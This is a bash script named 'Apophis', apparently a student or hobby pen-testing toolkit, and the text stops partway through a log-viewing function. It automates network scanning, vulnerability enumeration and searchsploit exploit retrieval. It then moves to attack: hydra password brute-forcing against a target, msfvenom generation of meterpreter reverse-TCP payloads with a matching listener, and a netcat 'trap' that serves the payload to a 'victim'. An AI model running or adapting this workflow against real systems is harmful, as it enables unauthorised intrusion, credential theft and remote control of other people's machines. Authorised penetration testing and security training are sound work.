#!/bin/bash

# Author: Horus

# Date created: 16/10/2022

# Last edited: 16/10/2022

# Description:  A script used to conduct scans on a network, identify a target device
# 				Analyze the device's ports and services for vulnerabilties,
# 				then exploit them and access the machine.

# Usage:



# ---------------------------------------COLOUR LIST------------------------------------------------------------------

NC='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
#----------------------------------------FILEPATHS------------------------------------------------------

Apophis_path="/var/log/Apophis"


# ---------------------------------------Root_Check------------------------------------------------------------------

function ruroot()
{
	if [ "$EUID" -ne 0 ]
	then
		echo -e "You're not root. ${Red}¬_¬${NC}"
		exit
	fi
	
}


#----------------------------------------Dir Check----------------------------------------------------

function dircheck()
{	
	echo -e "Creating initial directory for Apophis.\n"
	sleep 1
	cd /var/log
	
	mkdir -p Apophis
	cd /home/horus
}

#----------------------------------------Apps Check---------------------------------------------------

function appcheck()
{
	apps=( "nmap" "hydra" "figlet" "gnome-terminal" "msfconsole")
	
	echo -e "${Cyan}Proceeding with automatic update and upgrade of current systems...${NC}\n"
	sleep 1
	sudo apt-get install && sudo apt-get upgrade -y
	sleep 1
	echo -e "${Green}Updates and Upgrades complete.${NC}\n"
	sleep 1
	
	echo -e "${Yellow}Essential applications for this script to work:${NC}\n"
	
	for tools in ${apps[@]}
	do
		echo $tools
		chk=$(command -v $tools)
		echo -e "${chk}"
		
		if [ -z $chk ]
		then
			echo -e "${Red}This app is not installed!${NC}\n"
			sleep 1
			echo -e "conducting installation now..."
			sudo apt-get install $tools -y
			echo ""
			
		else
			echo -e "${Green}installed!${NC}\n"
			sleep 1
			
		fi
	done
	
	echo -e "All necessary apps installed.\n"
	sleep 1
	
	intro_screen
}

#----------------------------------------Intro Screen-------------------------------------------------

function intro_screen()
{
	echo "APOPHIS" | figlet -f pagga
	
	echo -e "Welcome to Apophis, your all-purpose pen-testing toolkit."
	main_menu

}
#----------------------------------------Main Menu----------------------------------------------------


function main_menu()
{
	echo -e "${Blue}-----Main Menu-----${NC}\n\nPlease select one of the following options: "
	sleep 1
	select main_option in Initiate_toolkit Logs Exit
	do
		case $main_option in
		
		Initiate_toolkit)
			echo -e "\nYou have chosen to initiate the toolkit."
			sleep 0.5 
			echo -e "${Cyan}Re-directing...${NC}"
			sleep 1
			toolkit_init
		;;
		
		Logs)
			echo -e "\nYou have chosen to ${Cyan}access the logs${NC}.\n"
			sleep 0.5
			echo -e "Re-directing...\n"
			# Logs Function
			log_menu
		;;
		
		Exit)
			echo -e "\nYou have chosen to exit the program."
			sleep 0.5
			echo -e "Thank you for using Apophis."
			sleep 0.5
			echo -e "${Red}Exiting...${NC}"
			exit
		;;
		
		*)
			echo -e "That is an invalid option. Try again."
			main_menu
		;;
		
		esac
	done
	
}

#---------------------------------------Toolkit Init Function-------------------------------------------
function toolkit_init()
{
	echo -e "\n${Cyan}Welcome to Phase One of Apophis - Target Identification${NC}\n"
	sleep 1 
	echo -e "Please ${Yellow}specify the network range${NC} you would like to scan, ${Red}without the CIDR${NC}:\ne.g 192.168.136.0, 10.10.0.0, etc. "
	read network_range_noCIDR
	
	echo ""
	echo -e "Please ${Yellow}specify the CIDR${NC}: \n\n${Blue}e.g\nSubnet mask		CIDR\n\n255.255.255.0		24\n255.255.0.0		16${NC}\n"
	read CIDR_value
	
	scan_range="$network_range_noCIDR/$CIDR_value"
	echo -e "\n${Green}$scan_range${NC}"
	
	cd "$Apophis_path"
	dir_name="$network_range_noCIDR"_CIDR"$CIDR_value"
	mkdir -p "$dir_name"
	cd ~
	echo -e "${Yellow}[*]${NC} Selected range for scanning: ${Green}$scan_range${NC}"
	echo -e "${Green}[+]${NC} Directory created: ${Green}$dir_name${NC}\n"
	sleep 1
	echo ""
	
	#PATH to new directory
	target_path="/var/log/Apophis/$dir_name"
	
	echo -e "${Green}[+]${NC} Creating sub-directories for target range.\n"
	sleep 1
	
	cd "$target_path"
	mkdir -p Scan_logs
	mkdir -p Enumeration_logs
	mkdir -p Exploitation_logs
	
	#PATH for new directory
	target_scan_path="/var/log/Apophis/$dir_name/Scan_logs"
	target_enum_path="/var/log/Apophis/$dir_name/Enumeration_logs"
	target_exploit_path="/var/log/Apophis/$dir_name/Exploitation_logs"
	cd "$target_enum_path"
	mkdir -p NSE_Enums
	mkdir -p Searchsploit_Enums
	
	cd ~
	#Enum PATHS
	target_NSE_path="/var/log/Apophis/$dir_name/Enumeration_logs/NSE_Enums"
	target_searchsploit_path="/var/log/Apophis/$dir_name/Enumeration_logs/Searchsploit_Enums"
	
	cd "$target_exploit_path"
	mkdir -p hydra_logs
	mkdir -p generated_payloads
	mkdir -p metasploit_logs
	
	#Exploit PATHS
	target_hydra_path="/var/log/Apophis/$dir_name/Exploitation_logs/hydra_logs"
	target_payloads_path="/var/log/Apophis/$dir_name/Exploitation_logs/generated_payloads"
	target_msf_path="/var/log/Apophis/$dir_name/Exploitation_logs/metasploit_logs"
	
	
	echo -e "${Cyan}Proceeding to Phase 2 - Scanning${NC}"
	sleep 1
	scan_phase_basic
}


function scan_phase_basic()
{
	echo -e "${Cyan}Initiating Phase Two - Scanning${NC}\n"

	sleep 1 
	
	echo -e "Initiating basic scan of top 1000 ports on target network ${Green}$scan_range${NC}"
	cd "$target_scan_path"
	sudo nmap "$scan_range" -v0 -oN "$dir_name"_basic
	cd ~
	pwd
	echo ""
	echo -e "Basic scan complete. Output results saved to ${Cyan}$target_scan_path${NC}"
	echo ""
	
	echo -e "\n${Yellow}Printing Scan results now...${NC}\n"
	sleep 1
	
	read_scan_basic=$(cat "$target_scan_path"/"$dir_name"_basic)
	echo "$read_scan_basic"
	echo -e "-----------------------------------"
	IFS=$'\n' read -r -d '' -a live_hosts_array < <(cat "$target_scan_path"/"$dir_name"_basic | grep "scan report" | awk '{print $NF}' | tr -d '()' && printf '\0' )
	# We've just put all the live hosts from our scan into an array. Now we can print them.
		
	echo -e "Live Hosts:\n"
	for hosts in ${live_hosts_array[@]}
	do
		echo -e "${Green}$hosts${NC}"
	done 
		
	echo -e "-------------------------------------"
	echo -e "\n\nProceeding to ${Yellow}specialized scanning...${NC}"
	special_scan

	
}

function special_scan()
{
	echo -e "Please ${Yellow}select a target${NC} from the live hosts:\n "
	select target in ${live_hosts_array[@]}
	do
		echo -e "\nTarget selected: ${Green}$target${NC}"
		echo -e ""
		echo -e "Please ${Yellow}select a scan type${NC} from the options below: "
		echo -e "You may also choose to return to the main menu or proceed to Phase 3 - ENUMERATION.\n"
		select scan_type in Service OS Aggressive ENUMERATION Main_Menu
		do
			case $scan_type in
			
			Service)
				echo -e "\n${Yellow}Starting service scan${NC} of all ports for $target${Cyan}"
				cd "$target_scan_path"
				nmap -sV "$target" -v2 -p- -oN "$target"_servicescan
				echo ""
				echo -e "${NC}${Yellow}Service scan${NC} performed on ${Green}$target${NC}.\nResults saved to ${Cyan}$target_scan_path${NC}"
				echo ""
				
				cd ~
				special_scan 
			;;
			
			OS)
				echo -e "\n${Yellow}Starting OS scan${NC} of ${Green}$target${NC}${Yellow}"
				cd "$target_scan_path"
				nmap -O "$target" -v2 -p- -oN "$target"_OSdetection
				echo ""
				echo -e "OS Detection${NC} performed on ${Green}$target${NC}.\nResults saved to ${Cyan}$target_scan_path${NC}."
				echo ""
				
				echo -e "General info from OS scan:\n${Cyan} "
				cat "$target"_OSdetection | grep -A4 "MAC Address"
				echo -e "${NC}"
				
				cd ~
				special_scan
			;;
			
			Aggressive)
				echo -e "\n${Yellow}Starting Aggressive scan${NC} of ${Green}$target${NC}${Red}"
				cd "$target_scan_path"
				nmap -A "$target" -v2 -p- -oN "$target"_Aggressive
				echo ""
				echo -e "${NC}${Yellow}Aggressive scan${NC} performed on ${Green}$target${NC}.\nResults saved to ${Cyan}$target_scan_path${NC}."
				echo ""
				
				cd ~
				pwd
				special_scan
			;;
			
			ENUMERATION)
				echo -e "\n${Cyan}Re-directing to Phase 3 - ENUMERATION${NC}"
				sleep 1
				enumeration_menu
			;;
			
			Main_Menu)
				echo -e "Returning to main menu..."
				main_menu
			;;
			 
			*)
				echo -e "Invalid option selected. Try again."
				special_scan
			;;
			
			esac
		done
	done
	
}

function enumeration_menu()
{
	echo -e "${Cyan}Initiating Phase 3 - ENUMERATION${NC}\n"
	sleep 1
	echo -e "Please ${Yellow}select the Enumeration tool${NC} you would like to use, or proceed to Phase 4 - EXPLOITATION:\n "
	
	select enum_choice in NSE Searchsploit EXPLOIT Main_Menu Exit
	do
		case $enum_choice in
		
		NSE)
			echo -e "\nYou have chosen to enumerate using the ${Yellow}Nmap Scripting Engine${NC}.\n"
			nscript_engine
		;;
		
		Searchsploit)
			echo -e "\nYou have chosen to enumerate using ${Yellow}Searchsploit${NC} \n"
			search_sploit
		;;
		
		
		Main_Menu)
			echo -e "\n${Cyan}Returning to main menu...${NC}"
			main_menu
		;;
		
		EXPLOIT)
			echo -e "\n${Cyan}Re-directing to Phase 4 - EXPLOITATION.${NC}"
			sleep 1
			exploit_menu
		;;
		
		Exit)
			echo -e "Thank you for using Apophis."
			echo -e "Exiting..."
			exit
		;;
		
		*)
			echo -e "Invalid option, try again."
			enumeration_menu
		;;
		
		esac
	done
	
}

function nscript_engine()
{
	echo -e "${Cyan}Phase 3 - ENUMERATION\nNSE module selected${NC}\n"
	echo -e "Please ${Yellow}choose the script${NC} you would like to use:\n "
	select script_choice in default vuln_detect malware_detect discovery enum_menu
	do
		case $script_choice in
		
		default)
			echo -e "\nYou have chosen to run NSE using the ${Yellow}default script${NC}."
			sleep 0.5
			echo -e "This script runs the default set of scripts commonly run with -A on nmap."
			sleep 0.5
			echo -e "Running default script scan now...${Cyan}"
			sleep 1
			
			cd "$target_NSE_path"
			sudo nmap "$target" -sC -v2 -p- -oN NSE_Default_"$target"
			
			echo -e "${NC}\n${Green}Default script scan complete.${NC}"
			echo -e "Results saved to ${Cyan}$target_NSE_path${NC}\n"
			cd ~
			
			nscript_engine #Go back to nse options menu
		;;
		
		vuln_detect)
			echo -e "\nYou have chosen to run the NSE using the ${Yellow}vuln script${NC}."
			sleep 0.5
			echo -e "These scripts ${Yellow}check for specific known vulnerabilities${NC} and generally only report results if they are found."
			sleep 0.5
			echo -e "${Cyan}Running vuln script scan now...${NC}${Yellow}"
			
			cd "$target_NSE_path"
			sudo nmap "$target" --script=vuln -v2 -p- -oN NSE_Vuln_"$target"
			
			echo -e "${NC}\n${Green}Vuln script scan complete.${NC}"
			echo -e "Results saved to ${Cyan}$target_NSE_path${NC}\n"
			
			cat NSE_Vuln_"$target" | grep VULNERABLE -B1 -A2 > Vulnerabilties_list_"$target"
			echo -e "Vulnerabilities list generated and stored in ${Cyan}Vulnerabilities_list_$target${NC}\n"
			
			cd ~
			nscript_engine
		;;
		
		malware_detect)
			echo -e "\nYou have chosen to run the NSE using the ${Yellow}malware detection script${NC}"
			sleep 0.5
			echo -e "These scripts ${Yellow}test whether the target platform is infected by malware or backdoors.${NC}\n"
			sleep 0.5
			echo -e "${Yellow}Running malware detection script scan now...${NC}${Blue}"
			
			cd "$target_NSE_path"
			sudo nmap "$target" --script=malware -v2 -p- -oN NSE_Malware_"$target"
			
			echo -e "${NC}\n${Green}Malware Detection scan complete.${NC}"
			echo -e "Results saved to ${Cyan}$target_NSE_path${NC}\n"
			
			cd ~
			nscript_engine
		;;
		
		discovery)
		echo -e "\nYou have chosen to run the NSE using the ${Yellow}discovery script${NC}."
		sleep 0.5
		echo -e "These scripts try to actively discover more about the network by querying public registries, SNMP-enabled devices, directory services, and the like.\n"
		sleep 0.5
		echo -e "${Yellow}Running discovery script scan now...${NC}${Blue}"
		
		cd "$target_NSE_path"
		sudo nmap "$target" --script=discovery -v2 -p- -oN NSE_Discovery_"$target"
		
		echo -e "${NC}\n${Green}Discovery script scan complete.${NC}"
		echo -e "Results saved to ${Cyan}$target_NSE_path${NC}\n"
		
		cd ~
		nscript_engine
		;;
		
		enum_menu)
			echo -e "${Green}Returning to Enumeration Menu...${NC}"
			enumeration_menu
		;;
		
		
		esac
	done
	
}

function search_sploit()
{
	echo -e "${Cyan}Phase 3 - ENUMERATION\nSearchsploit module selected${NC}"
	cd "$target_searchsploit_path"
	echo -e "\n${Yellow}Please hold while searchsploit runs an update...${NC}\n"
	searchsploit -u
	echo -e "\n${Green}Update complete.${NC}\nPlease ${Yellow}input the OS${NC} of the target system (e.g Linux, Windows): "
	read search_OS
	
	echo -e "\nPlease ${Yellow}input the name of the service/protocol${NC} you would like to filter for: "
	read proto_service
	
	echo -e "\n${Green}Information collected. Running search...${NC}"
	sleep 1
	searchsploit "$search_OS" "$proto_service" > exploitlist
	cat exploitlist
	
	cat exploitlist | awk -F/ '{print $(NF)}' | awk -F. '{print $1}' | grep -o [0-9]* > sploitidlist.txt
	
	
	echo ""
	echo -e "Refer to the output above, and input the exploit ID below: "
	echo -e "e.g in (linux/dos/42137.txt), the exploit ID would be 42137."
	read exploit_id
	
	id_check=$(cat sploitidlist.txt | grep -w "$exploit_id" | wc -l)
	
	if [ $id_check == 0 ]
	then
		echo -e "\n${Red}Invalid exploit code selected.\nTry again!${NC}\n"
		sleep 1
		enumeration_menu
		
	else
		id_selection=$(cat exploitlist | grep -w "$exploit_id")
		echo -e "\n${Cyan}Copying the following exploit to current directory:${NC}\n "
		sleep 1
		echo -e "$id_selection"
		cd "$target_payloads_path"
		searchsploit -m "$exploit_id"
		echo ""
		echo -e "${Green}Copy complete.${NC}\nReturning to Enumeration Menu...\n"
		sleep 1
		enumeration_menu
	fi	
	
}


function exploit_menu()
{
	echo -e "${Cyan}Inititating Phase Four - EXPLOITATION${NC}\n"
	echo -e "Please ${Yellow}select one of the following options${NC} to carry out the exploits: "
	echo ""
	
	select exploit_choice in bruteforce msfconsole main_menu Exit
	do
		case $exploit_choice in
			
		bruteforce)
			echo -e "You have chosen to use the ${Yellow}bruteforce function${NC}, to test for weak passwords."
			cd "$target_hydra_path"
			hydra
		;;
		
		
		msfconsole)
			echo -e "You have chosen to use the ${Yellow}Metasploit Framework${NC} module."
			cd "$target_msf_path"
			msfconsole
			
		;;
		
		main_menu)
			echo -e "${Green}Returning to main menu...${NC}"
			main_menu
		;;
		
		Exit)
			echo -e "Thank you for using Apophis.\n${Red}Exiting...${NC}"
			exit
		;;
		
		esac
	
	done
	
}


function hydra()
{
	echo -e "Phase 4 - EXPLOITATION\nBruteforce module selected.\n"
	
	echo -e "Please specify the path to the userlist: "
	read brute_userlist
	
	echo -e "\nPlease specify the path to the password list: "
	read brute_passlist
	
	echo -e "\nPlease specify the service you are trying to bruteforce: "
	read brute_service

	sudo gnome-terminal --window -- bash -c "hydra -L $brute_userlist -P $brute_passlist $target $brute_service -vV -o ${target}_brute_creds" || echo -e "Something went wrong, try again."
	
	echo -e "\n${Green}Bruteforce Running.${NC}\nResults will be saved to ${Cyan}$target_hydra_path${NC}."
	
	exploit_menu
}

function msfconsole()
{
	echo -e "Phase 4 - EXPLOITATION\nMSFconsole Module selected."
	
	echo -e "Before we continue, please fill in the following:\n"
	echo -e "Who is the LHOST: "
	read lhost
	echo -e "\nWhat is the LPORT: "
	read lport
	
	sleep 1
	echo -e "\nSelect one of the following options: \n"
	
	select msf_option in Create_payload Start_listener Payload_trap Exploit_menu Quit
	do
		case $msf_option in
		
		Create_payload)
			echo -e "\nInitiating payload generation tool:\n "
			cd "$target_payloads_path"
			msfpoison
		;;
		
		Start_listener)
			echo -e "\nInititating listener execution tool: \n"
			cd "$target_msf_path"
			pwd
			#INSERT LISTENER FUNC HERE
			listener
		;;
		
		Payload_trap)
			echo -e "\nInitiating Payload Trap..."
			cd "$target_payloads_path"
			
			#INSERT TRAP FUNC HERE
			trapset
		;;
		
		Exploit_menu)
			echo -e "Returning to the Exploit Menu: \n"
			sleep 1
			exploit_menu
		;;
		
		Quit)
			echo -e "Thank you for using Apophis.\nExiting..."
			exit
		;;
		
		esac
	done
	# option 1 - create a payload
	# option 2 - start a listener locally
	# option 3 - load payload into port for target to access
	
}

function msfpoison()
{
	cd "$target_payloads_path"
	echo -e "This module only supports meterpreter/reverse_tcp payloads: "
	echo -e "Please wait while the necessary directories and dependent files are created...\n"
	mkdir -p tmp
	cd tmp
	
	msfvenom -l payloads | grep -w "meterpreter/reverse_tcp" | awk '{print $1}' > payload_options
	
	cd "$target_payloads_path"
	pwd
	IFS=$'\n' read -r -d '' -a payload_options_array < <( cat tmp/payload_options && printf '\0' )
	
	echo -e "Please select the payload you would like to use: "
	select payload in ${payload_options_array[@]}
	do
		echo -e "You have selected: ${Green}$payload${NC}\n"
		echo -e "Please select one of the following formats:\n "
		
		system=$(echo $payload | awk -F/ '{print $1}') #So I can add the front part of the payload to the name of the output file (e.g "windows" in "windows/meterpreter/reverse_tcp")
		
		select payload_format in py exe raw elf
		do
			echo -e "\nCreating payload... \n"
			msfvenom -p "$payload" lhost="$lhost" lport="$lport" -f "$payload_format" -o rev"$system""$lport"."$payload_format"
		
			echo -e "Payload created and stored in: ${Green}"
			pwd
			
			echo -e "${NC}"
			
			sudo rm -rf tmp
			msfconsole
		done
		
	done
}

function listener()
{
	mkdir -p tmp
	cd tmp
	
	echo 'use exploit/multi/handler' > listener.rc
	echo -e "Please enter the name of the payload.\nEnsure it matches the payload used in the exploit:"
	read listener_load
	
	echo "set payload $listener_load" >> listener.rc
	echo -e "set lhost $lhost" >> listener.rc
	echo -e "set lport $lport" >> listener.rc
	echo 'run' >> listener.rc
	
	echo -e "Please wait while the listener terminal opens and runs: \n"
	sudo gnome-terminal --window -- bash -c "sudo msfconsole -r listener.rc"
	echo -e "Listener terminal in effect...\n"
	sleep 0.5
	
	msfconsole
}

function trapset()
{
	cd "$target_payloads_path"
	
	echo -e "This option simply loads up the generated payload into a local port of your choice."
	sleep 0.5
	echo -e "You will still have to find a way to get the victim to access the open port and download the payload."
	sleep 1
	
	
	echo -e "Which port would you like to use? "
	read port_choice
	
	IFS=$'\n' read -r -d '' -a payload_list_array < <( ls && printf '\0' )
	
	echo -e "Please select from the list of available payloads: "
	select load_list_choice in ${payload_list_array[@]}
	do
		echo -e "You have selected $load_list_choice"
		sudo gnome-terminal --window -- bash -c "nc -nlvp $port_choice < $load_list_choice"
		
		msfconsole
	done
	
}

function log_menu()
{
	
	cd /var/log/Apophis
	echo -e "Current directory: ${Green}"
	pwd
	
	echo -e "${NC}\n\nWelcome to the ${Yellow}Apophis Log Menu${NC}.\nFrom here, you can view the various logs recorded during Apophis' activation."
	
	#LOG FILEPATHS
	scan_log_path="/var/log/Apophis"
	
	echo -e "\nWhich ${Cyan}network's logs${NC} would you like to view? \n"
	IFS=$'\n' read -r -d '' -a network_logs_array < <(ls && printf '\0' )
	
	select network_logs_choice in ${network_logs_array[@]}
	do
	
		echo -e "\nYou have chosen to view the logs of the network: ${Green}$network_logs_choice${NC}\n"
		
		cd "$network_logs_choice"
		
		echo -e "${Green}You are now in: "
		pwd
		echo -e "${NC}"
		
		# LOG FILEPATH PT2
		scan_log_path="/var/log/Apophis/$network_logs_choice/Scan_logs"
		enum_log_path="/var/log/Apophis/$network_logs_choice/Enumeration_logs"
		exploit_log_path="/var/log/Apophis/$network_logs_choice/Exploitation_logs"
		
		NSE_log_path="/var/log/Apophis/$network_logs_choice/Enumeration_logs/NSE_Enums"
		searchsploit_log_path="/var/log/Apophis/$network_logs_choice/Enumeration_logs/Searchsploit_Enums"
		
		hydra_logs_path="/var/log/Apophis/$network_logs_choice/Exploitation_logs/hydra_logs"
		
		echo -e "Please select which category of logs you would like to view: "
		select log_menu_option in Scans Enumeration Exploits Main_menu Exit
		do
			case $log_menu_option in 
			
			Scans)
				echo -e "\nYou have chosen to view the ${Yellow}Scan Logs${NC}.\n"
				#SCAN_LOG_FUNCTION
				scan_log
			;;
			
			Enumeration)
				echo -e "You have chosen to view the Enumeration Logs."
				#ENUM_LOG_FUNCTION
				enum_log
			;;
			
			Exploits)
				echo -e "You have chosen to view Exploit Results."
				#EXPLOIT_RESULTS_FUNCTION
				exploitation_log
			;;
			
			Main_menu)
				echo -e "You have chosen to return to the main menu.\nRe-directing..."
				sleep 1
				main_menu
			;;
			
			Exit)
				echo -e "Thank you for using Apophis.\n${Red}Exiting...${NC}"
				exit
			;;
			
			*)
				echo -e "That is an invalid option. Try again!"
				log_menu
			;;
			
			esac
		done
	done
}

function scan_log()
{	
	cd "$scan_log_path"
	
	echo -e "Currently in: ${Green}"
	pwd
	
	echo -e "${NC}\n Which scans would you like to view? "
	select scan_view_type in Basic Service OS_Detect Aggressive Log_menu
	do
		case $scan_view_type in
		
		Basic)
			echo -e "\nYou have chosen to view the ${Cyan}basic scans${NC}. Select which scan you would like to view: \n"
			IFS=$'\n' read -r -d '' -a basic_scans_array < <(ls | grep "basic" && printf '\0' )
			
			select basic_scan_choice in ${basic_scans_array[@]}
			do
				echo -e "\nYou have selected ${Green}$basic_scan_choice${NC} \n"
				live_hosts_basic=$(cat $basic_scan_choice | grep "scan report" | awk '{print $NF}' | tr -d '()')
				
				echo -e "${Green}Live hosts: \n"
				echo -e "$live_hosts_basic${NC}\n\n"
				
				network_open_ports_basic=$(cat 192.168.136.0_CIDR24_basic | grep "open" | grep "tcp")
				echo -e "${Yellow}Open ports on network:${NC}\n "
				echo -e "$network_open_ports_basic\n\n"
				
				echo -e "Would you like to view the full report? [Y/N]"
				read basic_full_report
				
				if [ ${basic_full_report^^} == "Y" ]
				then 
					echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
					cat "$basic_scan_choice"
					echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
					scan_log
					
				elif [ ${basic_full_report^^} == "N" ]
				then
					echo -e "\n${Cyan}Returning to scan log menu...${NC}"
					scan_log
					
				else
					echo -e "${Red}Invalid option selected./nTry again!${NC}"
					scan_log
				fi
			done
		;;
		
		Service)
			echo -e "\nYou have chosen to view the ${Yellow}service scans${NC}. Select which scan you would like to view: \n"
			IFS=$'\n' read -r -d '' -a service_scans_array < <(ls | grep "servicescan" && printf '\0' )
			
			select service_scan_choice in ${service_scans_array[@]} 
			do
				echo -e "\nYou have chosen to view ${Green}$service_scan_choice${NC}\n"
				portsnservices=$( cat $service_scan_choice | grep /tcp )
				echo -e "List of ${Cyan}open ports${NC} and ${Yellow}services running on them${NC}: \n"
				echo -e "$portsnservices\n\n"
				
				echo -e "Would you like to view the full report? [Y/N]"
				read services_full_report
				
				if [ ${services_full_report^^} == "Y" ]
				then
					echo -e "Printing full report now: \n\n"
					sleep 1 
					
					echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
					cat "$service_scan_choice"
					echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
					scan_log
					
				elif [ ${services_full_report^^} == "N" ]
				then
					echo -e "Returning to scan log menu..."
					scan_log
					
				else
					echo -e "${Red}Invalid option.\nReturning to scan log menu...${NC}"
					sleep 0.5 
					scan_log
					fi
			done
		;;
		
		OS_Detect)
			echo -e "\nYou have chosen to view the ${Yellow}OS_Detection scans${NC}. Select which scan you would like to view: \n"
			IFS=$'\n' read -r -d '' -a OS_scans_array < <(ls | grep "OSdetection" && printf '\0' )
			
			select OS_scan_choice in ${OS_scans_array[@]}
			do
				echo -e "You have chosen to view $OS_scan_choice"
				OS_stats=$(cat $OS_scan_choice | grep "MAC Address" -A4)
				
				echo -e "General OS statistics: "
				echo -e "${Cyan}$OS_stats${NC}\n\n"
				
				echo -e "Would you like to view the full report? [Y/N]"
				read OS_full_report
				
				if [ ${OS_full_report^^} == "Y" ]
				then
					echo -e "Printing full report now: \n"
					sleep 1 
					
					echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
					cat "$OS_scan_choice"
					echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
					
					scan_log
					
				elif [ ${OS_full_report^^} == "N" ]
				then
					echo -e "\nReturning to scan log menu..."
					scan_log
				
				else
					echo -e "Invalid option! Try again."
					scan_log
				fi
			done
		;;
		
		Aggressive)
			echo -e "\nYou have chosen to view the ${Yellow}Aggressive scans${NC}. Select which scan you would like to view: \n"
			IFS=$'\n' read -r -d '' -a aggro_scans_array < <(ls | grep "Aggressive" && printf '\0' )
			
			select aggro_scan_choice in ${aggro_scans_array[@]}
			do
			echo -e "You have chosen to view ${Green}$aggro_scan_choice${NC}"
			aggro_stats=$(cat $aggro_scan_choice | grep "Uptime guess" -A4 )
			aggro_script_stats=$(cat $aggro_scan_choice | grep "Host script results" -A100)
			
			echo -e "Uptime guess and general stats:\n"
			echo -e "$aggro_stats"
			
			echo -e "\nresults of host script: \n"
			echo -e "$aggro_script_stats\n\n"
			
			echo -e "Would you like to view the full report? [Y/N]"
			read aggro_full_report
			
			if [ ${aggro_full_report^^} == "Y" ]
			then
				echo -e "${Yellow}Printing full report now...${NC}\n"
				sleep 1
				
				echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
				cat "$aggro_scan_choice"
				echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
				
				scan_log
				
			elif [ ${aggro_full_report^^} == "N" ]
			then
				echo -e "Returning to scan log menu...\n"
				scan_log
			
			else
				echo -e "Invalid option! Try again!\n"
				scan_log
			fi
			
			done
			
		;;
		
		Log_menu)
			echo -e "Returning to log menu..."
			sleep 1
			log_menu
		;;
		
		*)
			echo -e "${Red}Invalid option. Try again!${NC}"
			sleep 1
			scan_log
		;;
			
		esac
	done
	
}

function enum_log()
{
	cd "$NSE_log_path"
	
	echo -e "\nYou are now located in: ${Green}"
	pwd
	echo -e "${NC}\n"
	
	echo -e "From here, you can view the various scans conducted via the Nmap Scripting Engine."
	echo -e "Select which NSE scan type you would like to view: \n"
	
	select enum_view_type in default vuln malware discovery Log_menu
	do
		case $enum_view_type in
		
		default)
			echo -e "\nYou have chosen to view the ${Yellow}default NSE scans${NC}."
			echo -e "Select which scan you would like to view: "
			IFS=$'\n' read -r -d '' -a NSEdefault_scans_array < <(ls | grep "Default" && printf '\0' )
			
			select nsedefault_scan_choice in ${NSEdefault_scans_array[@]}
			do
				echo -e "You have chosen to view ${Green}$nsedefault_scan_choice${NC}"
				host_script_stats=$(cat $nsedefault_scan_choice | grep "Host script results" -A100)
				
				echo -e "\nHost script results: \n"
				echo -e "$host_script_stats\n\n"
				
				echo -e "Would you like to view the full report? [Y/N]"
				read nsedefault_full_report
				
				if [ ${nsedefault_full_report^^} == "Y" ]
				then
					echo -e "${Yellow}Printing full report now...${NC}\n"
					sleep 1
					
					echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
					cat "$nsedefault_scan_choice"
					echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
					
					enum_log
					
				elif [ ${nsedefault_full_report^^} == "N" ]
				then
					echo -e "Returning to the Enumeration Log Menu.."
					sleep 0.5
					
					enum_log
				
				else
					echo -e "${Red}Invalid option!\nTry again!${NC}"
					enum_log
					
				fi
			
			done
		;;
		
		vuln)
			echo -e "You have chosen to view the ${Yellow}NSE Vuln Script Scans${NC}"
			echo -e "Select which scan you would like to view: "
			
			IFS=$'\n' read -r -d '' -a NSEvuln_scans_array < <(ls | grep "_Vuln_" && printf '\0' )
			
			select nsevuln_scan_choice in ${NSEvuln_scans_array[@]}
			do
				echo -e "You have chosen to view ${Green}$nsevuln_scan_choice${NC}\n"
				
				vuln_list=$(cat $nsevuln_scan_choice | grep "VULNERABLE" -B1 -A2)
				
				echo -e "${Yellow}Summarized list of vulnerabilties:${NC} \n"
				sleep 1
				echo -e "$vuln_list\n"
				
				
				echo -e "\n\nWould you like to view the full report? [Y/N]"
				read vuln_full_report
				
				if [ ${vuln_full_report^^} == "Y" ]
				then
					echo -e "${Yellow}Printing full report now...${NC}\n"
					sleep 1
					
					echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
					cat "$nsevuln_scan_choice"
					echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
				
					enum_log
					
				elif [ ${vuln_full_report^^} == "Y" ]
				then
					echo -e "Returning to enumeration log menu..."
					sleep 1 
					
					enum_log
				
				else
					echo -e "${Red}Invalid option!\nTry again!${NC}"
					enum_log
				
				fi
				
			done
			
		;;
		
		malware)
			echo -e "You have chosen to view the ${Yellow}NSE Malware Script Scans${NC}"
			echo -e "Select which scan you would like to view: "
			
			IFS=$'\n' read -r -d '' -a NSEmal_scans_array < <(ls | grep "Malware" && printf '\0' )
			
			select mal_scan_choice in ${NSEmal_scans_array[@]}
			do
				echo -e "You have chosent to view ${Green}$mal_scan_choice${NC}\n"
				backdoor_presence=$(cat $mal_scan_choice | grep backdoor)
				
				echo -e "${Yellow}Backdoor presence:${NC} \n"
				echo -e "$backdoor_presence\n"
				
				echo -e "Would you like to view the full report? [Y/N]"
				read mal_full_report
				
				if [ ${mal_full_report^^} == "Y" ]
				then
					echo -e "${Yellow}Printing full report now...${NC}\n"
					sleep 1 
					
					echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
					cat "$mal_scan_choice"
					echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
				
					enum_log
					
				elif [ ${mal_full_report^^} == "N" ]
				then
					echo -e "Returning to enumeration log menu..\n"
					sleep 1
					
					enum_log
				else
					echo -e "${Red}Invalid option.\nTry again!${NC}"
					sleep 0.5
					enum_log
				fi
				
				
			done
		;;
		
		discovery)
			echo -e "You have chosen to view the ${Yellow}NSE Discovery Script Scans${NC}"
			echo -e "Select which scan you would like to view: "
			
			IFS=$'\n' read -r -d '' -a disc_scans_array < <(ls | grep "Discovery" && printf '\0' )
